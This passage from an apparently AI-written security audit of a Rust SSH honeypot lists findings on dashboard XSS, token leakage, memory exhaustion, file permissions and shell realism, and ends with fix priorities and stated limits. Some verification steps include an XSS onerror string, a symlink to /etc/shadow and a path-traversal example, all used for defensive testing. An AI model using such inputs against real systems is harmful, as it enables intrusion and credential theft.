**Suggested fix.** Add a response-header middleware setting `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self'; img-src 'self' data:; frame-ancestors 'none'; base-uri 'none'`, plus `X-Content-Type-Options: nosniff` and `Referrer-Policy: no-referrer`. (The page currently uses one big inline `<script>`/`<style>`, hence `'unsafe-inline'`; moving to external files under `script-src 'self'` with a nonce is the stronger end state.) Consider an `HttpOnly; Secure; SameSite=Strict` cookie instead of `localStorage` so script cannot read the token — the SSE endpoint is the reason `?token=` exists (see AEG-021), and a cookie solves that case natively since `EventSource` sends cookies with `withCredentials`. Longer term, replace the hand-rolled `innerHTML` templating with `textContent`/`createElement` so escaping is structural rather than a convention that must hold at every call site.

**How to verify.** `curl -sI -H "Authorization: Bearer $T" http://127.0.0.1:8080/` shows the headers. Inject a `<img src=x onerror=...>` string as an SSH username, load the dashboard, and confirm it renders as literal text and that any attempted outbound fetch is blocked by CSP (visible in the browser console).

---

### AEG-021 — `?token=` is accepted on every route, leaking the credential into logs and history
**Severity:** Medium
**Location:** `crates/aegis-dashboard/src/main.rs:189`, `200-205`

**What's wrong.** The auth middleware falls back to a query parameter for **every** route:
```
let provided = header_token.map(str::to_owned).or_else(|| query_token(request.uri()));
```
The documented justification (`main.rs:172-177`) is real and correct — the browser `EventSource` API cannot set custom headers, so `/api/stream` genuinely needs a non-header mechanism. But the fallback is applied globally rather than scoped to the one endpoint that needs it, so the token is a valid credential in a URL on every path.

This is the known trade-off in SSE authentication: `EventSource` ignores custom headers, pushing developers to either cookies or tokens in the URL — and **URL tokens appear in access logs, browser history, `Referer` headers, and CDN cache keys**. The mitigation this code does implement is good: `history.replaceState` scrubs the URL immediately after first load (`index.html:511`), and the token is 256-bit so guessing is infeasible. What remains is everything upstream of the browser — any reverse proxy, load balancer, or CDN in front of the dashboard logs the full request line by default, writing the token to disk in plaintext in a file with different permissions and retention than `dashboard_token` (0600). The token is also long-lived with no expiry or rotation mechanism beyond deleting the file and restarting.

**Suggested fix.** Scope the query-parameter fallback to `/api/stream` only; require the `Authorization` header everywhere else. Better, eliminate it: set an `HttpOnly; Secure; SameSite=Strict` session cookie on first authentication and have the frontend open `EventSource` with `withCredentials: true` — cookies are sent automatically, no header needed, and the token stops being script-readable (also closing AEG-020's exfiltration step). If the query parameter is kept, issue a short-lived (≤60s) stream-scoped token distinct from the master token rather than passing the master token itself. Document that the dashboard must not be fronted by a proxy that logs query strings, and add token rotation.

**How to verify.** `curl "http://127.0.0.1:8080/api/summary?token=$T"` returns 401 while the header form returns 200, and `curl "http://127.0.0.1:8080/api/stream?token=$T"` still streams. Confirm no token appears in proxy access logs during a normal browser session.

---

### AEG-022 — Dashboard reads unbounded attacker-influenced files fully into memory
**Severity:** Medium
**Location:** `crates/aegis-dashboard/src/main.rs:348-357` (`session_cast`), `264` (`read_new_lines`)

**What's wrong.** Two unbounded reads on files whose size the attacker controls via AEG-008.

1. `session_cast` serves a replay file with `tokio::fs::read_to_string(&path)` — the whole file into a `String`, then into a response body. With the per-keystroke `.cast` amplification from AEG-008, an attacker can drive a single session's `.cast` to many gigabytes.
2. `read_new_lines` pre-allocates the entire unread tail every poll: `Vec::with_capacity((len - *offset) as usize)` followed by `read_to_end`. If `attacks.json` grows sharply between 1.5-second polls — or if the dashboard is started against a large existing log, where `offset` begins at 0 and the *entire file* is read in one allocation — that is a single allocation the size of the log.

`is_valid_session_id` (`main.rs:331`) is solid, by the way: hex-only with a length bound, so `../../etc/passwd` cannot reach `sessions_dir.join(id)`. Path traversal on these endpoints is properly closed.

**Attack scenario.** Attacker inflates one session's `.cast` to 8 GB (AEG-008), then the operator clicks that session in the dashboard to investigate. The dashboard allocates 8 GB and is OOM-killed — the attacker has made *investigating them* the thing that kills monitoring. Separately, restarting the dashboard against a large `attacks.json` allocates the whole file at once.

**Suggested fix.** Stream `.cast` responses with `tokio_util::io::ReaderStream` (`tokio-util` is already a workspace dependency with the `io` feature enabled) into an `axum::body::Body`, and cap the served size with a clear truncation marker so the player degrades rather than dies. Bound `read_new_lines` to a maximum chunk per poll (e.g. 8 MB), advancing `offset` incrementally across polls rather than swallowing the whole tail at once. Together with AEG-008's `.cast` cap, this closes the chain.

**How to verify.** Generate a 5 GB `.cast`, request it, and assert the dashboard's RSS stays flat while bytes stream. Start the dashboard against a 2 GB `attacks.json` and assert it catches up incrementally without a memory spike.

---

### AEG-023 — World-writable rootfs; credentials in world-readable files
**Severity:** Medium
**Location:** Filesystem state; `crates/aegis-vmm/src/rootfs.rs:102-108`; `crates/aegis-collector/src/lib.rs:57-61`, `134-139`

**What's wrong.** Observed permissions in the working tree:
```
drwxrwxrwx  rootfs/          <-- 0777, world-writable
drwxrwxrwx  rootfs/bin/      <-- 0777, world-writable
-rw-r--r--  attacks.json     <-- 0644, contains harvested credentials
-rw-r--r--  sessions/*.cast  <-- 0644, contains full session transcripts
-rw-------  host_key.pem     <-- 0600, correct
-rw-------  dashboard_token  <-- 0600, correct
```

The two secrets that were explicitly handled are handled correctly — `load_or_create_host_key` (`main.rs:51-55`) and `load_or_create_token` (`main.rs:148-152`) both `set_permissions(0o600)` after writing, and `.gitignore` covers `host_key.pem`, `dashboard_token`, `attacks.json`, `*.pem`, and `*.key`. `git ls-files` confirms no secret is tracked. The quarantine writes are also correct (0600 at `handler.rs:553` and `forensics/lib.rs:225,271`).

The gaps are the files nobody set permissions on:
1. **`rootfs/` is 0777.** It is the OverlayFS `lowerdir` and the fallback read path for `cat`/`ls` (`vfs.rs:446-459`). Any local user can plant files there, or replace an entry with a **symlink** — `std::fs::read_to_string` follows symlinks, so `rootfs/etc/motd -> /etc/shadow` would cause the honeypot (running as root) to read the host's real shadow file and serve it to the attacker over SSH. This requires a local foothold, which is why it is Medium and not High, but it is a straightforward local-to-remote information-disclosure pivot.
2. **`attacks.json` and `.cast` files are 0644** and inherit the process umask (022). They contain every harvested username/password pair and full attacker session transcripts. Any local user can read the entire credential corpus.

**Suggested fix.** `chmod 0755 rootfs` (or 0555 — it is meant to be a read-only golden image) and have `ensure_golden_rootfs` set explicit directory modes rather than relying on umask; it already sets per-file modes carefully (0644/0640/0600/0444/0440) but never sets directory modes beyond `/tmp` and `/var/tmp`. Set 0600 on `attacks.json` at creation in `EventCollector::run` and on `.cast` files in `SessionRecorder::open`, matching the pattern already used for quarantine files. Set a restrictive `umask(0o077)` at process startup so any future file creation is private by default. Resolve symlinks and verify containment under the expected root before reading in `vfs::cat`/`ls` (`std::fs::canonicalize` plus a `starts_with` check on the base), which also hardens the lowerdir path independently of its permissions.

**How to verify.** `ls -ld rootfs` shows no group/other write bit. `stat -c %a attacks.json sessions/*.cast` returns 600. Plant `rootfs/etc/canary -> /etc/shadow`, run `cat /etc/canary` in a session, and assert the honeypot does not serve host content.

---

### AEG-024 — Fake shell is trivially distinguishable from a real one
**Severity:** Medium
**Location:** `crates/aegis-gateway/src/shell.rs` (throughout); `crates/aegis-gateway/src/handler.rs:291`, `69-78`

**What's wrong.** Beyond the protocol-level tells in AEG-009, the emulated shell fails ordinary interaction in ways any competent bot notices on its first few commands. Current honeypot-fingerprinting work characterises exactly this: detection turns on *"inconsistencies in the honeypot's claimed identity versus observable properties... default file system layouts and user accounts in open-source honeypots... a lack of plausible, lived-in content."* Concretely here:

**Structural gaps (a single command reveals each):**
- **No pipe support.** `echo hello | grep hello` is dispatched with `prog = "echo"` and `args = "hello | grep hello"`, printing the pipe literally. Nothing in `dispatch` handles `|`. One of the most common shell constructs in existence.
- **No exec-channel handling.** `Handler::exec_request` is not implemented, so `ssh target "id"` does nothing. **Most automated bots use non-interactive exec**, not an interactive PTY — so the honeypot likely fails to capture the majority of real attack traffic. This is a data-collection failure as much as a detection one.
- **No `sftp`/subsystem, no `direct-tcpip` port forwarding, no `window_change`.** Common probes, all unhandled.
- **No variable expansion, no `$?`, no command substitution, no globbing, no `&&`/`||`.** `echo $?` prints the literal `$?`.
- **No tab completion or command history.** Arrow keys are swallowed by the escape-sequence filter (`handler.rs:298-311`), so Up gives nothing where a real bash recalls the previous line.

**Consistency failures (cross-check two outputs):**
- **`sleep` is not implemented** — `sleep 5` returns `bash: sleep: command not found` **instantly**, while `ls /bin` lists `sleep` and the real `rootfs/bin/sleep` exists. A timing probe and an inventory contradiction in one command.
- **Timing is uniformly ~0 ms.** Every builtin returns a precomputed constant, so there is no correlation between work and elapsed time — except `wget`, which blocks for up to 7 seconds. Real shells have variable, workload-correlated latency; the flat-zero profile is itself a signature, and AEG-012's cold-start mount cost adds a first-command outlier.
- **`date` returns the real host time** (`shell.rs:302-304`, `chrono::Local::now()` — leaking the host's timezone), while `uptime` is a hardcoded *"up 15 days"*, `last` shows fixed August 2026 logins, and the login banner says *"Last login: Mon Aug 26 22:14:07 2026"* (`handler.rs:291`). A single `date; uptime; last` shows three mutually inconsistent clocks.
- **`wget` output is fabricated with hardcoded values** (`fake_wget_progress`, `handler.rs:69-78`): always `--2026-08-27 18:25:00--`, always resolving to `192.0.2.1`, always `512 KB/s`, always `in 0.1s`. `192.0.2.0/24` is the RFC 5737 documentation range — a reserved address no real host resolves to. The reported size is `size_bytes / 1024` and substitutes 64 K when the result is 0, so `ls -l` on the downloaded file contradicts the progress bar for anything under 1 KB.
- **`uname` matches by substring** (`args.contains('a')`), so `uname -m` returns `Linux` instead of `x86_64`, and any flag containing the letter `a` returns the full `-a` output.
- **`ps` is static** and lists `sshd`, `nginx`, `mysqld`, `dockerd` at fixed PIDs, but `ls /proc` shows none of those PIDs and `netstat`/`ss` describe services that do not answer.
- **`history` returns 6 fixed entries** that differ from `cat ~/.bash_history`.
- **`passwd` prints `New password:` and then echoes the typed password in cleartext** — real `passwd` disables terminal echo. An instant tell, and it is the one command an attacker is most likely to try as root.
- **Any password authenticates on the first attempt** (`auth_password` at `handler.rs:250-260` always returns `Auth::Accept`). This is the single most-cited low-interaction-honeypot signature — real servers reject *something*.

**Suggested fix.** Prioritize by what a bot actually does: (1) implement `exec_request` — this is a capture-rate problem, not just a stealth one; (2) add pipe and `&&`/`||` handling and `$?`; (3) implement `sleep` with a real `tokio::time::sleep`, and add small randomized per-command latency drawn from a plausible distribution; (4) drive `date`, `uptime`, `last`, `/proc/uptime`, and the login banner from **one** monotonic fake-boot-time source so they cannot contradict each other; (5) reject the first 1–2 auth attempts before accepting, with realistic delay; (6) disable echo for `passwd`; (7) fix `uname` flag parsing; (8) generate `wget` output from the real fetch (real timing, real size, real resolved IP) or drop the fabricated specifics. Longer term, consider generating `ps`/`netstat`/`/proc` from one coherent simulated system-state model rather than independent string constants — the constants will always drift out of agreement with each other.

**How to verify.** Write a "detector" test suite that runs the cross-checks above (`date` vs `uptime` vs `last`; `ls /bin` vs `sleep`; `ps` vs `ls /proc`; `history` vs `.bash_history`) and assert consistency — this makes detection resistance a regression-testable property instead of a judgment call. Test `ssh target "id"` returns plausible output. Measure the command-latency distribution and confirm it is not a spike at zero.

---

### AEG-025 — `rm` treats any argument containing `r` or `f` as a flag
**Severity:** Medium
**Location:** `crates/aegis-gateway/src/vfs.rs:566-570`

**What's wrong.** Flag detection scans **all** tokens, including filenames, for the presence of a character:
```
let recursive = tokens.iter().any(|t| t.contains('r') || t.contains('R'));
let force     = tokens.iter().any(|t| t.contains('f'));
```
Any argument containing `r`, `R`, or `f` anywhere sets the corresponding flag. `rm report` is treated as `rm -r report`; `rm config` as `rm -f config`. The targets filter (`!t.starts_with('-')`) is correct, so only the flag detection is wrong.

**Attack scenario.** Contained but real: the blast radius is limited to the session's own upperdir (`resolve_upper_path` confines the path, and `resolve_disk_path_base` at `vfs.rs:176-185` correctly drops `.`/`..`/`/`-bearing components, so there is no traversal). The impact is (a) **evidence destruction** — an attacker who types `rm readme` unintentionally, or deliberately, recursively deletes a directory tree of artifacts that forensics would otherwise have analysed at teardown, and (b) a **detection signal**, since the divergence from real `rm` behaviour is observable (`rm somedir_r` succeeding without `-r` is not how `rm` works). The same substring-matching pattern appears in `mkdir` (`-p` detection is exact-match and correct) and in `shell.rs` for `uname`/`crontab`/`ip` (AEG-024).

**Suggested fix.** Parse flags only from tokens that begin with `-`, then match characters within those tokens: `tokens.iter().filter(|t| t.starts_with('-')).any(|t| t.contains('r'))`. Apply the same discipline to every flag-parsing site in `vfs.rs` and `shell.rs`; a small shared arg-parsing helper (flags vs. operands, with `--` handling) would fix the whole class at once and improve AEG-024's realism.

**How to verify.** Unit test: `rm report` on a directory returns `rm: cannot remove 'report': Is a directory` and leaves it intact; `rm -r report` removes it. Add equivalent tests for the other flag-parsing sites.

---

## LOW / INFO

### AEG-026 — README materially overstates implemented security properties
**Severity:** Low (documentation) — but it is the reason several findings above are dangerous
**Location:** `README.md:10-11,40,46-50,66,93-97,320-321`

Five specific claims are not supported by the code, each corresponding to a finding above:

| README claim | Reality |
|---|---|
| "Anti-Fingerprinting Engine: Emulates OpenSSH 9.6p1 protocol characteristics, banners... to defeat scanners like Shodan and Censys" (`:48`) | Banner is `SSH-2.0-russh_0.46.0`; no spoofing code exists — AEG-009 |
| "Kernel eBPF Telemetry Probes" (`:11`, `:50`) | `EBPF_BYTES` is empty; no probe ever attaches — AEG-014 |
| "Ephemeral OverlayFS Mount Isolation... never leak between sessions" (`:47`) | 34 orphaned session dirs on disk; no `Drop`-based teardown — AEG-006 |
| "Zero-Execution Sandbox: No malicious code is ever executed on the host system" (`:46`) | True of the shell, but the gateway makes attacker-directed outbound HTTP requests — AEG-004 |
| "Each session gets its own PTY, PID/Net/Mount/UTS namespaces" (`aegis-vmm/src/lib.rs:3-4`) | No PTY is opened, no child forked; `unshare` is a no-op — AEG-018 |

This matters beyond tidiness: an operator deciding *where* to deploy this reads these claims and concludes it is safe on a network where, given AEG-004 and AEG-019, it is not. Recommend reconciling the README and module docs with the implementation in the same change that fixes each finding, and marking unimplemented features explicitly as roadmap.

### AEG-027 — Deployment hardening gaps
**Severity:** Low
**Location:** `deploy/Dockerfile`

- `cargo build --release -p aegis-gateway` without `--locked` — the audited `Cargo.lock` is not enforced at build time, so a fresh build can silently resolve different dependency versions than the ones audited here. Add `--locked`.
- `FROM rust:1.79-slim` is well behind the local toolchain (1.98.0); pin deliberately and refresh.
- Only `aegis-gateway` is built; the dashboard has no deployment story, so operators will improvise one (likely without the loopback bind default).
- No `HEALTHCHECK`, no read-only root filesystem, no `--security-opt no-new-privileges`, no resource limits. `VmmConfig.memory_limit_mb` and `cpu_quota_percent` (`common/src/lib.rs:387-388`) are parsed from config and **never used anywhere** — `grep` confirms no reader.
- See AEG-019 for the `USER aegis` vs. `--cap-add` contradiction.

### AEG-028 — `~` path resolution does not normalize `..`
**Severity:** Low (defense-in-depth)
**Location:** `crates/aegis-gateway/src/vfs.rs:150-160`

The `~` branch of `resolve` pushes every component verbatim, skipping only `""` and `"."` — unlike the main loop (line 168) which pops on `..`. So `cd ~/../../etc` yields `["root","..","..","etc"]`. **Not currently exploitable**: `resolve_disk_path_base` (line 179) drops any `..` component before touching the filesystem, and `get_node_safe` finds no child literally named `..`. But it means two code paths disagree about what a path means, and the safety depends entirely on the downstream filter. Normalize `..` in the `~` branch too, so path semantics are consistent regardless of which guard runs.

### AEG-029 — Escape-sequence state machine can swallow all subsequent input
**Severity:** Low
**Location:** `crates/aegis-gateway/src/handler.rs:298-311`

`escape_seq` is set on `0x1b` and cleared only by an ASCII alphabetic byte (or `~`). An attacker who sends `0x1b` followed only by digits/punctuation leaves the flag set permanently, and every subsequent byte is silently discarded — the session accepts input forever and records nothing. Self-inflicted, so it is not much of an attack, but it is also a (minor) detection signal, since a real terminal resynchronizes. Bound the escape sequence by length (real CSI sequences are short) and by a terminating-byte range check per ECMA-48, resetting on anything implausible.

### AEG-030 — eBPF ring buffer drops events silently and the consumer busy-polls
**Severity:** Low (latent — gated behind AEG-014)
**Location:** `crates/aegis-ebpf/ebpf/src/main.rs:38,83-86,145-148,184-187`; `crates/aegis-ebpf/src/lib.rs:111-132`

You asked what happens if events are dropped: **they vanish with no record.** All three programs use `if let Some(buf) = KERNEL_EVENTS.reserve::<KernelEvent>(0)` and simply do nothing on `None`. The ring buffer is 4 MB and `KernelEvent` is ~408 bytes, so roughly 10,000 events fit; under an execve flood the buffer fills and telemetry is lost invisibly. Add a per-CPU drop counter map, increment it on reserve failure, and surface it so the operator can distinguish "quiet" from "overwhelmed" — silent loss in a telemetry system is worse than loud loss. Separately, the consumer loop (`lib.rs:111-132`) drains `ring.next()` then calls `tokio::task::yield_now()` with no blocking wait, which spins a core continuously; use `AsyncPerfEventArray`/`RingBuf` async readiness (the `async_tokio` feature is already enabled in `Cargo.toml:25`) instead of a busy-poll.

### AEG-031 — Miscellaneous
**Severity:** Info

- **Dead code:** `PtyPair` (`vmm/lib.rs:26-63`), `SandboxHandle::reader`/`writer`/`root_path`, `ForensicsEngine::analyze_payload` (never called — the gateway inlines its own quarantine logic at `handler.rs:545-565`, which is why `PayloadCaptured` events from `wget` always carry `file_type: Unknown` and empty `strings_preview`/`base64_blobs`/`monero_wallets`, while teardown-discovered payloads get full analysis). Two code paths producing differently-shaped events for the same logical thing.
- **`VmmConfig.memory_limit_mb` / `cpu_quota_percent`** are parsed and never read — no cgroup limits are applied anywhere.
- **`LoggingConfig.level` / `json`** are parsed and never read; logging is configured purely from `RUST_LOG` (`main.rs:65-70`).
- **`EventCollector::new` takes `sessions_dir` and discards it** (`collector/lib.rs:43-44`).
- **`KernelEvent` is hand-duplicated** across `aegis-common` and the BPF crate with no static layout assertion — see the `unsafe` inventory.
- **Inactivity timeout is 3600s** (`handler.rs:669`). With `max_sessions = 512`, an attacker can hold every slot for an hour at near-zero cost. Consider a much shorter idle timeout plus a maximum total session duration.
- **`auth_publickey` accepts every key** and records it as `pubkey:<algorithm-name>` (`handler.rs:268`) — it discards the actual public key fingerprint, which is one of the more valuable correlation signals a honeypot can collect. Recording the key fingerprint would let you track a single actor across source IPs.

---

## Top 5 to Fix First

Ordered by (exploitability × blast radius), not by severity label alone.

1. **AEG-002 — `sudo` recursion stack overflow.** Confirmed: ~125 KB of input aborts the entire process. Not a catchable panic, not one session. Two small, low-risk changes (iterative `sudo` stripping + a `cmd_buffer` cap) and the cap simultaneously blunts AEG-008. Highest damage-to-effort ratio in the report — fix it today.
2. **AEG-003 — `echo "` panic.** Confirmed: a one-character command kills the session and, via AEG-006, permanently leaks a mount and directory each time. The fix is a `s.len() >= 2` guard. Near-certainly already firing in production by accident.
3. **AEG-001 — upgrade `russh` 0.46 → ≥0.62.5.** 12 advisories, 5 High, at least 4 pre-auth remote on the one component that touches unauthenticated bytes. This is the largest *unfixed* exposure, and it is listed third only because it is a genuine migration rather than a one-line patch — start it now in parallel, since it will take the longest. Add `rustls ≥0.23.45` in the same pass.
4. **AEG-004 + AEG-005 — attacker-directed egress and the bypassable SSRF guard.** Together these let an attacker make arbitrary HTTP requests from your host, including to cloud metadata via redirect, with the response readable back through `cat`. The fastest meaningful mitigation is a config flag defaulting `fetch_payloads = false`, which you can ship immediately while the proper URL parsing, redirect policy, and connect-time IP checks land. This is also the finding with third-party liability attached.
5. **AEG-006 — sandbox teardown leak.** 34 orphaned directories are on disk right now and forensics never ran on any of them, so you are *already* losing the data this honeypot exists to collect. A `Drop` impl plus a startup reconciliation pass fixes both the leak and the backlog.

**Honourable mention:** AEG-009 (the `russh` banner) is a one-line change — `server_id: SshId::Standard("SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.4".into())` — and it is the difference between being publicly catalogued as a Rust SSH server and looking like an Ubuntu box. Ship it alongside whatever you do first. Full HASSH alignment is a larger job; the banner is not.

---

## What I Could Not Check

Stated plainly so none of this reads as cleared:

- **`deny.toml` was not added to the repo.** `cargo deny check` *did* run (results above) against a config staged in the scratchpad, but the config itself was deliberately not written into the project under the read-only rule, so **there is still no dependency policy enforced in-tree or in CI**. The `allow-wildcard-paths = true` adjustment noted above should be applied before adopting it.
- **No dynamic testing against a running instance.** Everything here is static analysis plus two isolated reproductions compiled outside the repo. I never started the gateway, never opened an SSH connection to it, and never exercised the dashboard over HTTP. AEG-002 and AEG-003 are confirmed *as logic defects* by faithful reproduction of the exact source expressions; their end-to-end exploitability through the russh handler is inferred from the call path, not observed.
- **The eBPF programs were never compiled or verifier-checked.** You asked specifically about verifier assumptions — I could not test them, because no build path exists (AEG-014). The verifier will reject or accept the `bpf_probe_read_user` patterns and the `#[panic_handler] loop {}` in ways only a real load can determine. AEG-015's bugs were found by reading, and there may be more that only the verifier will surface. **Treat the eBPF crate as entirely unaudited.**
- **russh internals were not audited.** I verified the default `server_id` in the vendored 0.46.0 source and cross-referenced published advisories. I did not review russh's packet parsing for undisclosed issues, and I did not verify that any specific listed CVE is *reachable* in this configuration — I relied on the published vulnerable-version ranges.
- **No proof-of-concept exploit was written** for AEG-005 (SSRF bypass) or AEG-013 (IPv6 rate-limit bypass). Both are read from the code with high confidence — the AEG-005 port/userinfo bypasses follow directly from `format!("{host}:80")` failing to parse and the function returning `false` — but neither was demonstrated end to end.
- **Overlay mounts never actually succeed on this machine** (`grep -c overlay /proc/mounts` = 0), so all OverlayFS behaviour — mount options, teardown, `CAP_SYS_ADMIN` interaction, copy-up semantics — was assessed **from source only**, in the directory-fallback mode. Behaviour on a correctly privileged production host may differ, and AEG-006's leak is expected to be materially worse there.
- **Cryptographic review of the SSH layer** (KEX, cipher negotiation, host-key handling) was not performed beyond the fingerprinting surface; it is delegated to russh and is in scope of the AEG-001 upgrade.
- **Concurrency/TOCTOU review is partial.** I traced `IpConnectionGuard`'s locking (never held across `.await` — correct) and the session lifecycle, but did not systematically analyse interleavings between concurrent sessions sharing `overlay_base`, the quarantine directory, or `attacks.json`. Session IDs are 12 hex chars from a v4 UUID (48 bits), so collisions are unlikely but not impossible over a long-running deployment; `SessionRecorder::open` uses `.truncate(true)`, so a collision silently destroys the earlier recording.
- **The uncommitted working-tree changes** (`README.md`, `aegis-dashboard/{main.rs,store.rs,static/index.html}`, +1059/-167) were audited as the current state. I did not diff them against `HEAD` to determine which findings are newly introduced versus pre-existing.
- **Frontend review focused on XSS sinks and the auth flow.** I did not audit the replay player's `parseCast` for malformed-input handling beyond noting its `try`/`catch`, nor the SVG geo-map rendering in depth.

---

## Sources

Dependency advisories:
- [RustSec Advisory Database](https://rustsec.org/advisories/) — RUSTSEC-2026-0154, RUSTSEC-2026-0153, RUSTSEC-2026-0285, RUSTSEC-2023-0071
- [rustsec/advisory-db](https://github.com/rustsec/advisory-db) — full advisory text for RUSTSEC-2026-0153/0154 (fetched from source)
- [GitHub Advisory Database](https://github.com/advisories?query=russh) — the 12 applicable russh CVEs with exact vulnerable-version ranges (queried via `api.github.com/advisories?ecosystem=rust&affects=russh`)
- [CVE-2026-46673 / GHSA-g9f8-wqj9-fjw5](https://github.com/Eugeny/russh/security/advisories/GHSA-g9f8-wqj9-fjw5) — upstream russh advisory

OverlayFS / kernel:
- [Armis — CVE-2023-0386 Linux kernel OverlayFS privilege escalation](https://www.armis.com/threat-alert/linux-kernel-overlayfs-privilege-escalation-vulnerability/)
- [Datadog Security Labs — CVE-2023-0386: overview, detection, remediation](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/)
- [The Hacker News — CISA warns of active exploitation of CVE-2023-0386 (KEV, June 2025)](https://thehackernews.com/2025/06/cisa-warns-of-active-exploitation-of.html)
- [ProjectDiscovery — GameOver(lay): CVE-2023-2640 / CVE-2023-32629](https://blog.projectdiscovery.io/gameover-lay-local-privilege-escalation-in-ubuntu-kernel/)

Honeypot fingerprinting:
- [salesforce/hassh — SSH client/server fingerprinting standard](https://github.com/salesforce/hassh)
- [Open Sourcing HASSH — Salesforce Engineering](https://engineering.salesforce.com/open-sourcing-hassh-abed3ae5044c/) — hasshServer detection of Cowrie/Kippo purporting to be OpenSSH
- [Gotta catch 'em all: a Multistage Framework for honeypot fingerprinting (arXiv:2109.10652)](https://arxiv.org/pdf/2109.10652) — identity-vs-observable inconsistency as the core detection primitive
- [SoK: Honeypots & LLMs (arXiv:2510.25939)](https://arxiv.org/pdf/2510.25939) — Internet-wide scan results for Cowrie/Kippo detection
- [SANS ISC — Anatomy of a Linux SSH Honeypot Attack](https://isc.sans.edu/diary/32024)

Web/SSE dashboard:
- [Security Headers for Event Streams — server-sent-events.com](https://www.server-sent-events.com/sse-protocol-fundamentals-architecture/security-headers-for-event-streams/)
- [Authenticating SSE Streams with Tokens & Cookies](https://www.server-sent-events.com/sse-protocol-fundamentals-architecture/security-headers-for-event-streams/authenticating-sse-streams-with-tokens-and-cookies/) — URL tokens in access logs / history / Referer / CDN cache keys; short-TTL scoped tokens
- [Server-Sent Events Security: How EventSource Breaks Your API Authentication Model](https://dev.to/roxdavirox/server-sent-events-security-how-eventsource-breaks-your-api-authentication-model-3643)
